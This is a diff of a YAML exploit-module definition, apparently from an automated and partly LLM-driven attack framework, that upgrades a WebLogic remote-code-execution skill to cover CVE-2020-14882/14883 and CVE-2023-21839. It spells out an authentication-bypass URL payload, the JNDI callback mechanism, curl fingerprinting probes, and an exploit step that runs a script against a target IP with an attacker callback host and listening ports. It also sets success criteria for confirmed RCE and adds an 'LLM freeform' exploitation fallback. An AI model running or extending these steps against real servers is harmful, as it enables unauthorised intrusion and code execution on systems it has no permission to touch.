@@ -1,36 +1,57 @@
 # ═══════════════════════════════════════════════════════════
-# WebLogic CVE-2023-21839 — T3/IIOP JNDI 注入 RCE
+# WebLogic 多 CVE 利用 v2
+#
+# 支持:
+#   CVE-2020-14882/14883 — HTTP 认证绕过 + XML RCE（优先）
+#   CVE-2023-21839 — T3 JNDI 注入
 # ═══════════════════════════════════════════════════════════
 skill_id: weblogic_jndi_rce
-name: "WebLogic T3/IIOP JNDI 注入 RCE (CVE-2023-21839)"
+name: "WebLogic 多 CVE RCE (14882/14883/21839)"
 category: web_rce
-version: "1.0"
+version: "2.0"
 
 principle: |
-  WebLogic 的 T3/IIOP 协议存在 JNDI 注入漏洞。
-  通过 ForeignOpaqueReference 触发 JNDI lookup，
-  连接攻击者的 LDAP/RMI 加载恶意类 → RCE。
-  需要 LHOST 可被 WebLogic 回连。
+  WebLogic 存在多个高危 RCE 漏洞:
+  
+  1. CVE-2020-14882/14883（优先）:
+     - 14882: /console/css/%252e%252e%252fconsole.portal 绕过认证
+     - 14883: handle 参数加载远程 XML → Spring Context → RCE
+     - 纯 HTTP，不需要 T3 协议
+  
+  2. CVE-2023-21839:
+     - T3/IIOP 协议 JNDI 注入
+     - 需要回连（LDAP/RMI）
 
 match:
   rules:
     - fingerprint_contains: ["weblogic"]
     - fingerprint_contains: ["WebLogic"]
     - evidence_contains: ["weblogic"]
+    - evidence_contains: ["WebLogic"]
     - cve_matches: ["CVE-2023-21839"]
+    - cve_matches: ["CVE-2020-14882"]
+    - cve_matches: ["CVE-2020-14883"]
+    - cve_matches: ["CVE-2020-2551"]
+    - cve_matches: ["CVE-2018-2894"]
 
 probes:
   - id: confirm_weblogic
     description: "确认 WebLogic Console + T3 协议"
     steps:
       - command: |
+          # 从 ENDPOINT 提取 base URL
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "BASE_URL:$BASE"
+
           code=$(curl -s -o /dev/null -w "%{http_code}" \
-            "{ENDPOINT}/console/login/LoginForm.jsp" --max-time 10 2>/dev/null)
+            "$BASE/console/login/LoginForm.jsp" --max-time 10 2>/dev/null)
           echo "CONSOLE_STATUS:$code"
           if [ "$code" = "200" ] || [ "$code" = "302" ]; then
             echo "WEBLOGIC_CONFIRMED"
           fi
-          resp=$(curl -s -D - {ENDPOINT}/ --max-time 10 2>/dev/null)
+
+          # 也检查根路径
+          resp=$(curl -s "$BASE/" --max-time 10 2>/dev/null)
           if echo "$resp" | grep -qi "WebLogic\|Oracle"; then
             echo "WEBLOGIC_CONFIRMED"
           fi
@@ -40,24 +61,24 @@ probes:
 
 exploit_paths:
   - path_id: weblogic_script
-    name: "weblogic_exploit.py JNDI 注入"
+    name: "weblogic_exploit.py 多 CVE 利用"
     priority: 1
     conditions:
       weblogic_confirmed: true
     steps:
       - id: run_exploit
-        description: "T3 JNDI 注入 + JNDIExploit"
-        publish_ports: [1389, 8888, 39878]
+        description: "CVE-2020-14883 HTTP RCE + CVE-2023-21839 T3 JNDI"
+        publish_ports: [1389, 8888, 8889, 39878]
         command: |
           python3 /opt/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} \
             --lhost "$LHOST" 2>&1
-        timeout: 180
+        timeout: 240
         success_criteria:
           stdout_contains_any: ["WEBLOGIC_RCE_CONFIRMED"]
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
-          shell_type: "rce_weblogic_jndi"
+          shell_type: "rce_weblogic"
 
   - path_id: llm_freeform
     name: "LLM 自由推理"
@@ -69,4 +90,5 @@ exploit_paths:
 
 remediation: |
   1. 升级 WebLogic 至最新 CPU 补丁
-  2. 禁用 T3 协议或限制访问
+  2. 禁用 T3 协议或限制访问源 IP
+  3. 限制 /console 访问（ACL/WAF）
